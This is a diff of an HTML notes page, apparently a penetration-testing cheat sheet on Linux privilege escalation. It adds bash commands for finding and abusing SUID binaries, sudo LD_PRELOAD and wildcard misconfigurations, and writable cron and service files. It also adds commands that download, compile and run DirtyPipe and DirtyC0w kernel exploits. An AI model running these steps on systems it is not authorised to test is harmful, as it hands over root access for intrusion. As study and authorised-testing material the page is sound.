@@ -109,53 +109,94 @@
         <div class="notes-content">
           <div id="search-results"></div>
           <div id="note-content">
-            <h1 id="linux-privilege-escalation">Linux Privilege Escalation</h1>
-
-<h2 id="common-vectors">Common Vectors</h2>
+            <h2 id="privilege-escalation-vectors">Privilege Escalation Vectors</h2>
 
 <h3 id="suid-binaries">SUID Binaries</h3>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Find SUID binaries</span>
 find / <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null
 
-<span class="c"># Common SUID binaries to check</span>
-- /usr/bin/sudo
-- /usr/bin/pkexec
-- /usr/bin/passwd
-- /usr/bin/gpasswd
-- /usr/bin/newgrp
-</code></pre></div></div>
+<span class="c"># Check common SUID binaries</span>
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/newgrp
 
-<h3 id="sudo-misconfigurations">Sudo Misconfigurations</h3>
+<span class="c"># Test SUID binaries</span>
+strings &lt;binary&gt;
+strace &lt;binary&gt;
+
+<span class="c"># Test SUID binaries for exploits</span>
+strings /usr/bin/nmap
+strace /usr/bin/nmap
+
+<span class="c"># Example exploit for older nmap (if SUID)</span>
+/usr/bin/nmap <span class="nt">--interactive</span>
+</code></pre></div></div>
+<h3 id="sudo">Sudo</h3>
+
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check sudo permissions</span>
 <span class="nb">sudo</span> <span class="nt">-l</span>
 
-<span class="c"># Common sudo exploits</span>
-- LD_PRELOAD
-- SETENV
-- NOPASSWD
-- Wildcards
+<span class="c"># Check sudoers files for misconfigs</span>
+<span class="nb">cat</span> /etc/sudoers
+<span class="nb">cat</span> /etc/sudoers.d/<span class="k">*</span>
+
+<span class="c"># Exploit LD_PRELOAD</span>
+<span class="nb">sudo </span><span class="nv">LD_PRELOAD</span><span class="o">=</span>/tmp/malicious.so &lt;<span class="nb">command</span><span class="o">&gt;</span>
+
+<span class="c"># Exploit wildcards</span>
+<span class="nb">sudo</span> /bin/<span class="k">*</span>
 </code></pre></div></div>
 
+<h3 id="cron-jobs">Cron Jobs</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Inspect cron jobs</span>
+<span class="nb">cat</span> /etc/cron.<span class="k">*</span>
+<span class="nb">cat</span> /var/spool/cron/crontabs/<span class="k">*</span>
+crontab <span class="nt">-l</span>
+</code></pre></div></div>
+<h3 id="world-writable-files">World-Writable Files</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Find world-writable files</span>
+find / <span class="nt">-writable</span> 2&gt;/dev/null
+</code></pre></div></div>
 <h3 id="kernel-exploits">Kernel Exploits</h3>
-<ul>
-  <li>DirtyPipe (Linux Kernel 5.8+)</li>
-  <li>DirtyC0w (Linux Kernel &lt; 4.8.3)</li>
-  <li>Overlayfs (Ubuntu &lt; 15.04)</li>
-</ul>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check kernel version</span>
+<span class="nb">uname</span> <span class="nt">-r</span>
+
+<span class="c"># Find kernel exploits</span>
+searchsploit linux kernel <span class="si">$(</span><span class="nb">uname</span> <span class="nt">-r</span><span class="si">)</span>
+
+<span class="c"># Run DirtyPipe exploit (example)</span>
+wget &lt;dirtypipe_poc_url&gt; <span class="nt">-O</span> dirtypipe.c
+gcc dirtypipe.c <span class="nt">-o</span> dirtypipe
+./dirtypipe
+
+<span class="c"># Run DirtyC0w exploit (example)</span>
+wget &lt;dirtycow_poc_url&gt; <span class="nt">-O</span> dirtycow.c
+gcc dirtycow.c <span class="nt">-o</span> dirtycow
+./dirtycow
+</code></pre></div></div>
 
 <h3 id="service-misconfigurations">Service Misconfigurations</h3>
-<ul>
-  <li>Writable service files</li>
-  <li>Unquoted service paths</li>
-  <li>Weak permissions on service binaries</li>
-</ul>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check service files</span>
+<span class="nb">ls</span> <span class="nt">-l</span> /etc/systemd/system/
+<span class="nb">ls</span> <span class="nt">-l</span> /etc/init.d/
 
-<h2 id="tools">Tools</h2>
+<span class="c"># Find writable service files</span>
+find /etc/systemd/system/ <span class="nt">-writable</span> 2&gt;/dev/null
+find /etc/init.d/ <span class="nt">-writable</span> 2&gt;/dev/null
+
+<span class="c"># Check unquoted paths in services</span>
+ps aux | <span class="nb">grep</span> &lt;service&gt;
+</code></pre></div></div>
+
+<h2 id="automated-enumeration-tools">Automated Enumeration Tools</h2>
 <ul>
-  <li>LinPEAS</li>
-  <li>Linux Exploit Suggester</li>
-  <li>Linux Smart Enumeration</li>
-  <li>pspy64</li>
+  <li><a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS">LinPEAS</a></li>
+  <li><a href="https://github.com/rebootuser/LinEnum">LinEnum</a></li>
+  <li><a href="https://github.com/The-Z-Labs/linux-exploit-suggester">Linux Exploit Suggester</a></li>
+  <li><a href="https://github.com/diego-treitos/linux-smart-enumeration">Linux Smart Enumeration</a></li>
+  <li><a href="https://pentestmonkey.net/tools/audit/unix-privesc-check">Unix Privesc Check</a></li>
 </ul>
 
           </div>
